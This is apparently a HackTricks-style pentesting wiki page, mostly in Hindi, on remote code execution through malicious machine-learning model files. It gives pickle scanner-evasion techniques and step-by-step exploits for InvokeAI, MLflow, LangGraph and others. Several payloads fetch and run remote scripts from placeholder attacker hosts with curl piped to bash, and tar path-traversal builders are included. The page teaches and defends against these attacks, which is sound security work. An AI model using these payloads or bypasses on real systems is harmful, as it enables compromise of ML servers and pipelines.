# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE के लिए मॉडल लोड करना

Machine Learning मॉडल आमतौर पर ONNX, TensorFlow, PyTorch आदि जैसे अलग-अलग फ़ॉर्मैट में साझा किए जाते हैं। डेवलपर इन्हें इस्तेमाल करने के लिए अपनी मशीनों या production systems में लोड कर सकते हैं। आमतौर पर मॉडल में malicious code नहीं होना चाहिए, लेकिन कुछ मामलों में मॉडल का उपयोग system पर arbitrary code चलाने के लिए किया जा सकता है—या तो intended feature के रूप में, या मॉडल लोड करने वाली library में किसी vulnerability के कारण।

नीचे दी गई तालिका इस श्रेणी की कुछ प्रतिनिधि vulnerabilities सूचीबद्ध करती है:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` में insecure deserialization* **(CVE-2025-32434)**                                                              | मॉडल checkpoint में malicious pickle से code execution होता है (`weights_only` सुरक्षा को bypass करके)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution होता है; management API में Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` के ज़रिए असुरक्षित checkpoint deserialization **(CVE-2025-23298)**                                           | Untrusted checkpoint, `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer trigger करता है → ML worker में code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + असुरक्षित MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key से SQL/JSON-path syntax inject होता है, `UNION SELECT` एक fake checkpoint row बनाता है, फिर `msgpack` deserialization attacker द्वारा चुने गए Python code को import करके call करता है | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (असुरक्षित YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से मॉडल लोड करने पर `yaml.unsafe_load` इस्तेमाल होता है (code exec) <br> **Lambda** layer वाला मॉडल लोड करने पर arbitrary Python code चलता है          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | बनाया गया `.tflite` मॉडल integer overflow trigger करता है → heap corruption (संभावित RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के ज़रिए मॉडल लोड करने पर attacker के `__reduce__` payload वाला pickle execute होता है                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (असुरक्षित `np.load`) *विवादित*                                                                              | `numpy.load` में डिफ़ॉल्ट रूप से pickled object arrays की अनुमति थी – malicious `.npy/.npz` से code exec होता है                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX मॉडल का external-weights path directory से बाहर जा सकता है (arbitrary files पढ़ना) <br> Malicious ONNX model tar arbitrary files overwrite कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(कोई CVE नहीं)* ONNX custom ops / control flow                                                                                    | Custom operator वाले मॉडल के लिए attacker का native code लोड करना ज़रूरी होता है; जटिल model graphs, logic का दुरुपयोग करके अनपेक्षित computations चला सकते हैं   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` सक्षम होने पर model-load API के इस्तेमाल से relative path traversal द्वारा files लिखी जा सकती हैं (जैसे RCE के लिए `.bashrc` overwrite करना)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (कई heap overflows)                                                                         | Malformed GGUF model file parser में heap buffer overflows कराती है, जिससे victim system पर arbitrary code execution संभव होता है                     | |
| **Keras (older formats)**   | *(कोई नया CVE नहीं)* Legacy Keras H5 model                                                                                         | Lambda layer वाले malicious HDF5 (`.h5`) मॉडल का code लोड होने पर अब भी execute होता है (Keras safe_mode पुराने format को कवर नहीं करता – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (जैसे pickle-based model formats, Python `pickle.load`) में, जब तक mitigation न हो, model files में embedded arbitrary code execute हो जाता है | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata को `hydra.utils.instantiate()` में पास किया जाता है **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config में `_target_` को arbitrary callable (जैसे `builtins.exec`) पर सेट किया जाता है → लोड के दौरान execute होता है, “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) के साथ भी | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

इसके अलावा, PyTorch द्वारा इस्तेमाल किए जाने वाले कुछ Python pickle-based मॉडल भी हैं, जिन्हें `weights_only=True` के बिना लोड करने पर system पर arbitrary code चलाने के लिए इस्तेमाल किया जा सकता है। इसलिए, कोई भी pickle-based मॉडल इस तरह के attacks के प्रति विशेष रूप से संवेदनशील हो सकता है, भले ही वह ऊपर दी गई तालिका में सूचीबद्ध न हो।

### Pickle-based checkpoints पर static checks से बचना

ऐसा model-loading path जो unrestricted `pickle.load()`, `joblib.load()`, या `torch.load(..., weights_only=False)` call करता है, केवल parser नहीं, बल्कि execution sink है।<sup>[[22]](#references)</sup> PyTorch 2.6 में, जब कोई custom pickle module नहीं दिया जाता, तो `torch.load()` का डिफ़ॉल्ट `weights_only=True` होता है; नीचे दिए गए उदाहरणों में unsupported object लोड करने के लिए unrestricted loader या ऐसा application ज़रूरी है जो इस सुरक्षा को disable करता हो।<sup>[[4]](#references)</sup> Static scan का साफ़ परिणाम इस सीमा को नहीं बदलता।<sup>[[21]](#references)</sup>

बुनियादी `__reduce__` primitive के लिए [Python pickle deserialization](../pentesting-web/deserialization/#pickle) देखें; runtime import checks के लिए [Fickling's ML import allowlist](../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) देखें।

#### Callable register करें, फिर उसे `EXT2` से resolve करें

एक pickle, `REDUCE` के ज़रिए `copyreg.add_extension` call करके attacker द्वारा चुने गए numeric extension code के तहत module/name pair register कर सकता है। इसके बाद `EXT2` उस code को callable से resolve करता है, जिसे दूसरा `REDUCE` invoke कर सकता है। इसलिए, critical callable किसी `GLOBAL` या `STACK_GLOBAL` opcode का operand नहीं होता। Binarly ने इसे `multiprocessing.util.spawnv_passfds` के साथ प्रदर्शित किया; जाँचे गए पाँच में से चार scanners इसे नहीं पकड़ पाए, जबकि SaferPickle ने पकड़ लिया। Registry में बदलाव और `EXT2` resolution, एक ही unpickling operation के दौरान होते हैं।<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

यह opcode स्केच है, पूरा checkpoint नहीं: बाहरी loader को आसपास की pickle stream स्वीकार करनी होगी। केवल खतरनाक callables के लिए `GLOBAL` operands खोजने वाला scanner बाद में होने वाली lookup को चूक जाता है; `EXT2` support के बिना scanner verdict देने से पहले ही विफल हो सकता है। Strict allowlist `copyreg.add_extension` को भी अस्वीकार कर सकती है।<sup>[[21]](#references)</sup>

#### बनाए गए code-object types को सामान्य functions के पीछे छिपाएँ

एक अन्य pickle chain `type(copy.copy)` से `FunctionType` और `type(copy.copy.__code__)` से `CodeType` प्राप्त कर सकती है, फिर दिए गए bytecode से code object बनाकर उसे function के रूप में wrap करके call कर सकती है। प्रकाशित variant `operator.methodcaller('__getattribute__', '__code__')` के ज़रिए `__code__` प्राप्त करता है, इसलिए pickle को दोनों में से किसी constructor को नाम से import करने की ज़रूरत नहीं पड़ती। इसका `CodeType(...)` field layout और bytecode, CPython version पर निर्भर हैं; किसी दूसरे interpreter के लिए बनाया गया payload execution से पहले विफल हो सकता है। SaferPickle ने प्रदर्शित sample को फिर भी flag किया, लेकिन उसे `suspicious` तक downgrade कर दिया; मूल्यांकन किए गए बाकी चार scanners इसे चूक गए।<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### pickle argument से दूसरा model load trigger करना

एक outer pickle, attacker द्वारा दिए गए serialized model को argument के रूप में इस्तेमाल करके `torch.storage._load_from_bytes` को call कर सकता है। यह function `torch.load(io.BytesIO(b), weights_only=False)` call करता है, इसलिए nested model को weights-only restriction के बिना deserialize किया जाता है, भले ही top-level opcode scanner को यह एक callable को दिए गए bytes के रूप में दिखे। Outer load को फिर भी उस callable को स्वीकार करना होगा; `weights_only=True` से outer pickle अपने-आप इसे स्वीकार नहीं करता। जो scanners nested bytes को recurse करके नहीं देखते, वे अंदर की `GLOBAL`/`REDUCE` chain को चूक सकते हैं।<sup>[[21]](#references)[[23]](#references)</sup>

#### Load के समय legacy pickle module name resolve करना

Protocol 3 से कम वाले pickle protocols के लिए, Python का default `fix_imports=True`, `_compat_pickle.IMPORT_MAPPING` के ज़रिए `commands.run` के `GLOBAL` reference को `subprocess.run` पर map करता है। इसलिए, literal module string की तुलना `subprocess` denylist से करने वाला scanner runtime callable को चूक सकता है। इसके लिए ऐसा loader चाहिए जो compatibility mapping को बनाए रखे और नतीजे में मिले call arguments को स्वीकार करे।<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### non-ZIP checkpoint को ZIP-only scanner से आगे निकालना

Format selection, opcode inspection से स्वतंत्र रूप से विफल हो सकता है: Binarly ने पाया कि ModelScan 0.8.8 ने `.bin`, `.pt`, `.pth`, और `.ckpt` files को ZIP-specific PyTorch scanner पर भेजा और non-ZIP pickle stream को plain-pickle scanner पर fallback करने के बजाय छोड़ दिया। इसने एक legacy TAR model layout भी documented किया, जिसे `torch.load()` स्वीकार करता है, लेकिन ModelScan और JFrog ने inspect नहीं किया। ये scanner-version-specific gaps हैं, हर model scanner के गुण नहीं।<sup>[[21]](#references)</sup>

#### Static parser के malformed tail तक पहुँचने से पहले execute करना

`pickletools.genops()` से pickle को पूरी तरह पढ़ने वाला scanner, वैध `REDUCE` के बाद truncated opcode मिलने पर error raise कर सकता है। Unrestricted unpickler उस tail तक पहुँचने से पहले callable invoke कर चुका होता है, भले ही पूरा load बाद में exception raise करे। Report किए गए sample में executing `REDUCE` के ठीक बाद truncated `BINUNICODE` रखा गया था, जिससे `pickletools.genops()` fail हुआ, जबकि इससे पहले file-write side effect हो चुका था। यह scanner को तभी bypass करता है जब scanner parse error को clean माने या file को skip करे। यह तभी उपयोगी है जब side effect का महत्व हो और model सफलतापूर्वक return होना ज़रूरी न हो; जिस target को load पूरा होना आवश्यक है, वह artifact को reject कर सकता है।<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (safetensors के साथ भी काम करता है)

`hydra.utils.instantiate()` configuration/metadata object में दिए गए किसी भी dotted `_target_` को import करके call करता है। जब Hugging Face Transformers जैसी libraries **untrusted model metadata** को `instantiate()` में feed करती हैं, तो attacker ऐसा callable और arguments दे सकता है जो model load के दौरान तुरंत run हों (pickle की ज़रूरत नहीं)।<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload example (`.nemo` `model_config.yaml`, repo `config.json`, या `.safetensors` के अंदर `__metadata__` में काम करता है):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

मुख्य बिंदु:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders और FlexTok loaders में model initialization से पहले ट्रिगर होता है।
- Hydra की string block-list को वैकल्पिक import paths (जैसे `enum.bltns.eval`) या application-resolved names (जैसे `nemo.core.classes.common.os.system` → `posix`) के ज़रिए bypass किया जा सकता है।<sup>[[14]](#references)</sup>
- FlexTok, Hydra call से पहले `ast.literal_eval` के साथ stringified metadata को भी parse करता है, जिससे DoS (CPU/memory blowup) हो सकता है।

### 🆕  `torch.load` के ज़रिए InvokeAI RCE (CVE-2024-12029)

`InvokeAI` Stable-Diffusion के लिए एक लोकप्रिय open-source web interface है। **5.3.1 – 5.4.2** versions में REST endpoint `/api/v2/models/install` उपलब्ध है, जो users को arbitrary URLs से models download और load करने देता है।<sup>[[1]](#references)</sup>

आंतरिक रूप से, यह endpoint अंततः यह call करता है:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

जब दी गई फ़ाइल **PyTorch checkpoint (`*.ckpt`)** होती है, तो `torch.load` **pickle deserialization** करता है। चूँकि सामग्री सीधे user-controlled URL से आती है, इसलिए हमलावर checkpoint के अंदर custom `__reduce__` method वाला malicious object एम्बेड कर सकता है; यह method **deserialization के दौरान** निष्पादित होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो सकता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) असाइन किया गया था।

#### Exploitation का चरण-दर-चरण विवरण

1. एक malicious checkpoint बनाएँ:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` को अपने नियंत्रण वाले HTTP server पर host करें (जैसे, `http://ATTACKER/payload.ckpt`)।
3. Vulnerable endpoint को trigger करें (authentication आवश्यक नहीं है):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. जब InvokeAI फ़ाइल डाउनलोड करता है, तो यह `torch.load()` को कॉल करता है → `os.system` gadget चलता है और attacker को InvokeAI process के context में code execution मिल जाता है।

तैयार exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे flow को automate करता है।<sup>[[3]](#references)</sup>

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag का default **false** है)
•  `/api/v2/models/install` attacker के लिए reachable हो
•  Process के पास shell commands execute करने की permissions हों

#### बचाव

* **InvokeAI ≥ 5.4.3** पर upgrade करें – patch डिफ़ॉल्ट रूप से `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।<sup>[[2]](#references)</sup>
* Checkpoints को programmatically load करते समय `torch.load(file, weights_only=True)` या नए [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper का उपयोग करें।
* Model sources के लिए allow-lists / signatures लागू करें और service को least-privilege के साथ चलाएँ।

> ⚠️ याद रखें कि कोई भी Python pickle-based format (जिसमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` फ़ाइलें शामिल हैं) untrusted sources से deserialize करना मूलतः असुरक्षित है।

---

यदि आपको पुराने InvokeAI versions को reverse proxy के पीछे चलाना ही हो, तो ad-hoc mitigation का उदाहरण:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec में असुरक्षित `torch.load` के ज़रिए RCE (CVE-2025-23298)

NVIDIA के Transformers4Rec (Merlin का हिस्सा) में एक असुरक्षित checkpoint loader था, जो उपयोगकर्ता द्वारा दिए गए paths पर सीधे `torch.load()` कॉल करता था। चूँकि `torch.load` Python `pickle` पर निर्भर करता है, इसलिए attacker के नियंत्रण वाला checkpoint, deserialization के दौरान reducer के ज़रिए मनमाना code चला सकता है।<sup>[[5]](#references)</sup>

कमज़ोर path (fix से पहले): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`।

इससे RCE क्यों होता है: Python pickle में कोई object reducer (`__reduce__`/`__setstate__`) परिभाषित कर सकता है, जो एक callable और arguments लौटाता है। Unpickling के दौरान callable execute होता है। अगर checkpoint में ऐसा object मौजूद है, तो किसी भी weights का इस्तेमाल होने से पहले यह चलता है।

न्यूनतम malicious checkpoint का उदाहरण:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

डिलीवरी वेक्टर और प्रभाव का दायरा:
- repos, buckets या artifact registries के ज़रिए साझा किए गए Trojanized checkpoints/models
- ऐसे automated resume/deploy pipelines जो checkpoints को अपने-आप load करते हैं
- Execution training/inference workers के भीतर होता है, अक्सर elevated privileges के साथ (जैसे, containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने सीधे `torch.load()` के इस्तेमाल को हटाकर `transformers4rec/utils/serialization.py` में लागू restricted, allow-listed deserializer का इस्तेमाल किया। नया loader types/fields को validate करता है और load के दौरान arbitrary callables को invoke होने से रोकता है।<sup>[[7]](#references)</sup>

PyTorch checkpoints के लिए विशेष defensive guidance:
- Untrusted data को unpickle न करें। जहाँ संभव हो, [Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX जैसे non-executable formats को प्राथमिकता दें।
- यदि आपको PyTorch serialization का इस्तेमाल करना ही पड़े, तो सुनिश्चित करें कि `weights_only=True` हो (नए PyTorch versions में supported) या Transformers4Rec patch जैसा custom allow-listed unpickler इस्तेमाल करें।<sup>[[4]](#references)</sup>
- Model provenance/signatures लागू करें और deserialization को sandbox करें (seccomp/AppArmor; non-root user; restricted FS और कोई network egress नहीं)।
- Checkpoint load के समय ML services से अप्रत्याशित child processes की निगरानी करें; `torch.load()`/`pickle` के इस्तेमाल को trace करें।

POC और vulnerable/patch references:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch से पहले का vulnerable loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch के बाद का loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## उदाहरण – malicious PyTorch model तैयार करना

- Model बनाएँ:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- मॉडल लोड करें:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint उपलब्ध कराता है, जो user-controlled data को deserialize करता है। ZDI ने पुष्टि की कि remote attacker किसी victim को malicious page/file लोड करने के लिए बाध्य कर सकता है, उससे उस endpoint पर एक crafted serialized blob भेजवा सकता है, और `root` के रूप में deserialization trigger कर सकता है, जिससे पूरा सिस्टम compromise हो जाता है।

Exploit का flow आम pickle abuse जैसा है:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization के दौरान reachable कोई भी gadget (constructors, `__setstate__`, framework callbacks आदि) इसी तरह weaponize किया जा सकता है, चाहे transport HTTP, WebSocket हो या किसी watched directory में डाली गई file।

### LangGraph checkpointer SQLi → MessagePack RCE

यह attack chain दिलचस्प है, क्योंकि attacker को **malicious model file upload करने की ज़रूरत नहीं होती**। इसके बजाय, application एक **AI-agent persistence API** (`get_state_history(..., filter=...)`) expose करती है और user input checkpointer query builder तक पहुँचता है।

#### 1. Metadata filters में Structural SQLi

एक vulnerable SQLite pattern कुछ इस तरह दिखता था:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

मान बाद में bind किया जाता है, लेकिन `query_key` को **JSON path string** में concatenate किया जाता है, इसलिए dictionary key के अंदर मौजूद `'` `'$.{query_key}'` से बाहर निकलकर SQL inject करता है। यही सीख **JSON paths, identifiers, operators, `LIMIT`, और TTL fields** पर भी लागू होती है: placeholders केवल values को सुरक्षित रखते हैं, query syntax की संरचना को नहीं।

#### 2. `UNION SELECT` सिर्फ़ data theft ही नहीं, downstream sinks को भी target कर सकता है

Query `type` और serialized `checkpoint` bytes लौटाती है, जिन्हें बाद में इस तरह इस्तेमाल किया जाता है:

```python
self.serde.loads_typed((type, checkpoint))
```

इसका मतलब है कि `WHERE` clause में SQLi एक **नकली परिणाम पंक्ति** inject कर सकता है:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

अगर बाद में कोई code चुने गए column को parse, deserialize, write या execute करता है, तो उन columns को उनके sinks से map करें। इस मामले में fake row, SQLi को **attacker-controlled deserialization** में बदल देती है।

#### 3. Unsafe MessagePack extension hooks, code gadgets के बराबर होते हैं

LangGraph के `msgpack` path में एक custom extension hook का उपयोग किया गया था, जो nested tuple को unpack करके यह execute करता था:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

इसलिए, `("os", "system", "id > /tmp/pwned")` के समतुल्य किसी चीज़ को encode करने वाला MessagePack extension object, `os` को import करता है, `system` को resolve करता है और command चलाता है। AI frameworks की समीक्षा करते समय, **custom MessagePack/JSON/pickle revivers** में dynamic imports, reflection या arbitrary callable dispatch की जाँच करें।

#### 4. Agent frameworks के लिए व्यावहारिक audit pattern

ऐसे किसी भी user-controlled input की समीक्षा करें जो इन तक पहुँचता हो:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders, जो SQL या Redis query fragments जनरेट करते हैं
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, जो persistence layer से लौटाई गई rows पर भरोसा करते हैं

यह विशिष्ट chain, self-hosted LangGraph deployments को प्रभावित करती थी, जो **SQLite** या **Redis** checkpointers का उपयोग करते थे और जिनमें untrusted users `filter` को नियंत्रित कर सकते थे। Disclosure में बताए गए patched versions थे `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` और `langgraph-checkpoint 4.0.1+`।<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact overwrite से pickle RCE

`PythonModel` से बनाया गया MLflow PyFunc, serialized object को `python_model.pkl` के रूप में store कर सकता है। Model metadata, `mlflow.pyfunc.model` को अपना loader बताता है और MLflow का implementation, saved Python model के लिए इस filename का उपयोग करता है। नतीजतन, artifact store तक write access से किसी दूसरे application में code execution हो सकता है, जो बाद में model को load करता है।<sup>[[17]](#references)[[18]](#references)</sup>

उपयोगी chain है: **artifact write permission → pickle को replace करना → inference consumer से उसे दोबारा load करवाना**। `mlflow-artifacts:/...` root का उपयोग करने वाले proxied experiment के लिए, experiment, run और model artifact path की enumeration करें। Tracking server, `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` पर `GET` और `PUT` उपलब्ध कराता है।<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

एक न्यूनतम reducer, consumer द्वारा artifact को unpickle करते ही command execute कर सकता है। `MLmodel` में घोषित Python version का उपयोग करके payload generate करने से compatibility समस्याओं से बचा जा सकता है।<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

ऐसा operation trigger करें जो **मौजूदा model को load** करता हो, जैसे prediction, scoring या deployment। पहले retrain न करें, क्योंकि training malicious artifact को नए model से बदल सकती है। Application error से यह साबित नहीं होता कि exploit विफल रहा: reducer उपयोगी model के बजाय command का integer exit status लौटाता है। पहले ICMP या HTTP callback जैसे दिखाई देने वाले side effect से शुरुआत करें, फिर उसे final payload से बदलें।<sup>[[20]](#references)</sup>

Assessment के दौरान, run बनाने की permission और किसी दूसरे run के artifacts overwrite करने की permission में अंतर करें। Authentication और per-run update permissions की समीक्षा करें, `python_model.pkl` में अनपेक्षित modifications की जाँच करें, और model provenance तथा integrity को execution boundary का हिस्सा मानें। मौजूदा MLflow code में `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` सेट करने का विकल्प भी है, और cloudpickle data load करने के बजाय models-from-code artifacts इस्तेमाल करने की सलाह दी गई है।<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Exposed model servers और ML infrastructure

Malicious model load करना, ML infrastructure पर code चलाने का एकमात्र तरीका नहीं है। Job submission APIs, code-validation endpoints और self-hosted AI services के model registry pulls, किसी भी model file के बिना code execution तक ले जा सकते हैं। [Exposed Self-Hosted AI Services](AI-Exposed-Self-Hosted-AI-Services.md) देखें।

## Models से Path Traversal

[**इस blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है कि अलग-अलग AI frameworks द्वारा इस्तेमाल किए जाने वाले अधिकांश model formats archives पर आधारित होते हैं, आमतौर पर `.zip`। इसलिए, इन formats का दुरुपयोग करके path traversal attacks करना संभव हो सकता है, जिससे उस system से मनमानी files पढ़ी जा सकती हैं जहाँ model load किया जाता है।<sup>[[16]](#references)</sup>

उदाहरण के लिए, निम्नलिखित code से आप ऐसा model बना सकते हैं जो load होने पर `/tmp` directory में file बनाए:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

या, निम्नलिखित कोड से आप ऐसा मॉडल बना सकते हैं जो लोड होने पर `/tmp` डायरेक्टरी के लिए symlink बनाएगा:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### गहन अध्ययन: Keras .keras deserialization और gadget hunting

. keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import की समस्या, और allowlist के भीतर fix के बाद gadget discovery पर केंद्रित गाइड के लिए देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI: अविश्वसनीय डेटा का deserialization"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module का दस्तावेज़](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load के लिए सुरक्षा संबंधी विचार](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298: NVIDIA Merlin में Remote Code Execution प्राप्त करना](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Patch से पहले का vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Patch के बाद का loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – आधुनिक AI/ML formats और libraries के साथ Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate दस्तावेज़](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
